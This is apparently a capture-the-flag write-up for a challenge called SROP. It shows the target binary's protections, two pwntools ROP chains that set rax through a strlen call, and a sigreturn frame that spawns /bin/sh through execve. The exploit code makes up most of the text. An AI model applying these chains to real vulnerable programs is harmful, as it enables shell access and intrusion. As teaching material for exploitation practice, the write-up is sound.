# SROP

## Solution


Initially from the binary I can see that there is No PIE
```
/root/workspace/srop/chal.bin
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

To build the SROP chain I separated the chain into two separate payloads. One of these payloads would be the fake stack and the other would be the sigreturn frame for execve().

The first chain consisted of making the fake stack using a read sigreturn frame. To populate rax, I popped the address of a random string of length 0xf into rdi and called strlen. The first chain is shown below:

```
chain = cyclic(16)
chain += p64(pop_rdi)
chain += p64(next(e.search(b'e best of you?\n')))
chain += p64(e.plt['strlen'])
chain += p64(syscall_ret)
chain += bytes(frame)
```

The second chain consisted of putting /bin/sh at the top of the stack and then following the same pattern of populating rax to invoke a different sigreturn frame.

```
chain = b'/bin/sh\0'            # /bin/sh at top of stack
chain += p64(0)
chain += p64(pop_rdi)
chain += p64(next(e.search(b'e best of you?\n')))
chain += p64(e.plt['strlen'])
chain += p64(syscall_ret)               
chain += bytes(frame)        
```
The frames that are being use are constructed as seen below in the execve() sigreturn frame:

```
frame = SigreturnFrame()
frame.rax = 0x3b                
frame.rdi = fake_stack          
frame.rsi = 0x0                 
frame.rdx = 0x0                 
frame.rip = syscall_ret
```

